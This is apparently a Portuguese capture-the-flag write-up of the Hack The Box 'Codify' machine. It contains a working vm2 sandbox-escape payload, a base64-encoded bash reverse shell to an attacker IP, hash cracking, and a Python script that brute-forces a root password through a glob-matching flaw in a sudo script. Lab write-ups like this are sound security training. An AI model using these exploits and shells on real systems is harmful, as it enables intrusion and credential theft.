---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Codify - Fácil
date: 2024-01-24 19:34:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, script, web, facil]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/codify.png){: w="100" h="100" .left}

---
# **CTF - Codify**
---
---
## **Enumeração**

### nmap

```shell
┌──(kali💀kali)-[~/HTB/codify]
└─$ sudo nmap -sV -Pn --min-rate 1000 --stats-every=7s 10.10.11.239 -oA nmap -p-     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 21:26 -03
NSE Timing: About 99.43% done; ETC: 21:28 (0:00:00 remaining)
Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 62.50% done; ETC: 21:28 (0:00:01 remaining)
Nmap scan report for 10.10.11.239
Host is up (0.14s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.68 seconds
```
{: .nolineno }
### ffuf

```shell
________________________________________________

 :: Method           : GET
 :: URL              : http://codify.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .txt .bkp 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

About                   [Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 148ms]
about                   [Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 152ms]
editor                  [Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 166ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 155ms]
:: Progress: [81876/81876] :: Job [1/1] :: 586 req/sec :: Duration: [0:01:19] :: Errors: 0 ::
```
{: .nolineno }

indexof: `http://codify.htb:8000/`  
![Alt text](/assets/img/codify1.png)  

Os dois servers apresentam a mesma aplicação.
`http://codify.htb` e `http://codify.htb:3000` 
![Alt text](/assets/img/codify2.png)
![Alt text](/assets/img/codify3.png)

Me veio a cabeça que há algum possível RCE nessa página.

Em about se encontra essa página com link para essa library vm2 <https://github.com/patriksimek/vm2/releases/tag/3.9.16>
![Alt text](/assets/img/codify4.png)

Pesquisando sobre vm2  3.9.16 encontrei esse link:  
 <https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244>   
Onde contém um código que coloquei no editor da página e executei. O código usa de escape para injetar comando no servidor.

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```
{: .nolineno }
## **Acesso**
![Alt text](/assets/img/codify5.png)
Usando dos comandos chequei se tinha python, e tem, vou tentar reverse shell usando o python
![Alt text](/assets/img/codify6.png)

Não deu certo mesmo usando encode base64

Resolvi usar o bash e criar um shell script 

```shell
echo "echo  '#\!/bin/bash                                                                  
/bin/bash -i >& /dev/tcp/10.10.14.2/4443 0>&1' > xd.sh;chmod +x xd.sh"|base64
```
{: .nolineno }
Executado na página

`echo "ZWNobyAgJyMhL2Jpbi9iYXNoCi9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDMgMD4mMScgPiB4ZC5zaDtjaG1vZCAreCB4ZC5zaAo="|base64 -d|bash`
![Alt text](/assets/img/codify7.png)

Esta criado nosso script, executei e recebi a reverse shell.
![Alt text](/assets/img/codify8.png)

## **Exploração**

Vasculhando a pasta /var/www encontrei esse arquivo tickets.db com credenciais do usuário joshua. 

```shell
vc@codify:/var/www/html$ ls
index.html
svc@codify:/var/www/html$ ls -la
total 20
drwxr-xr-x 2 svc  svc   4096 Apr 12  2023 .
drwxr-xr-x 5 root root  4096 Sep 12 17:40 ..
-rw-r--r-- 1 svc  svc  10671 Apr 12  2023 index.html
svc@codify:/var/www/html$ cd ..
svc@codify:/var/www$ ls
contact  editor  html
svc@codify:/var/www$ cd editor/
svc@codify:/var/www/editor$ ls
index.js  node_modules  package.json  package-lock.json  templates
svc@codify:/var/www/editor$ cd ..
svc@codify:/var/www$ ls
contact  editor  html
svc@codify:/var/www$ cd contact/
svc@codify:/var/www/contact$ ls
index.js  package.json  package-lock.json  templates  tickets.db
svc@codify:/var/www/contact$ cat tickets.db 
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:/var/www/contact$ 
```
{: .nolineno }
## **Escalação de Privilégio**
### **Escalando para usuário joshua**

Hash adicionada ao john

```shell
┌──(kali💀kali)-[~/HTB/codify]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:01:52 DONE (2024-01-23 23:40) 0.008927g/s 12.05p/s 12.05c/s 12.05C/s crazy1..eunice
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }
`Senha: spongebob1`

Porque não tentar login via ssh?

```shell
┌──(kali💀kali)-[~/HTB/codify]
└─$ ssh joshua@codify.htb                                                                                       
The authenticity of host 'codify.htb (10.10.11.239)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'codify.htb' (ED25519) to the list of known hosts.
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

........
 
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

joshua@codify:~$ 
```
{: .nolineno }
### Primeira Flag
![Alt text](/assets/img/codify9.png)

## **Escalando para root**

Joshua pode executar um script com sudo 
O script é para backup da database e pede senha do root, e não temos permissão de escrita.
```shell
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
{: .nolineno }


```bash
joshua@codify:/opt/scripts$ cat mysql-backup.sh 
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```
{: .nolineno }

Travei aqui, rodei linpeas, usei umas chaves ssh do root mas todas pedem senha. não tem binários exploráveis com SUID.

Pesquisando sobre o CTF 
Aparentemente essa parte do código do script eh vulnerável

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
```
{: .nolineno }

Essa é a explicação da vulnerabilidade, meio confuso pra mim ainda XD, mas da pra entender

Esta seção do script compara a senha fornecida pelo usuário (USER_PASS) com a senha real do banco de dados (DB_PASS). A vulnerabilidade aqui se deve ao uso de == dentro de [[ ]] no Bash, que executa correspondência de padrões em vez de uma comparação direta de strings. Isso significa que a entrada do usuário (USER_PASS) é tratada como um padrão e, se incluir caracteres glob como * ou ?, pode potencialmente corresponder a strings não intencionais.
Por exemplo, se a senha real (DB_PASS) for password123 e o usuário inserir * como senha (USER_PASS), a correspondência de padrão será bem-sucedida porque * corresponde a qualquer sequência, resultando em acesso não autorizado.
Isso significa que podemos aplicar força bruta em cada caractere no DB_PASS.



**Script em python pra brute force de cada character da senha.**

O script Python que explora isso testando prefixos e sufixos de senha para revelar lentamente a senha completa.
Ele cria a senha caractere por caractere, confirmando cada suposição invocando o script via sudo e verificando se a execução foi bem-sucedida.

```python
import string
import subprocess

def check_password(p):
    command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return "Password confirmed!" in result.stdout

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
    for char in charset:
        if check_password(password + char):
            password += char
            print(password)
            break
    else:
        is_password_found = True

print("Password found: ", password)
```
{: .nolineno }  
Executando o Script em python.

![Alt text](/assets/img/codify10.png)

Password found:  `kljh12k3jhaskjh12kjh3`
## Segunda Flag
```shell
joshua@codify:/tmp$ su
Password: 
root@codify:/tmp# cd /root
root@codify:~# ls
root.txt  scripts
root@codify:~# cat root.txt 
ee2429dfb96287b425775d7d2e5e8e54
root@codify:~# 
```
{: .nolineno }  
**Conhecimentos adiquiridos:**
-	Sobre Vulnerabilidade na aplicação web.
-	Entendimento básico sobre esse script de backup, e exploração da vulnerabilidade.
    ![Alt text](/assets/img/codify11.png)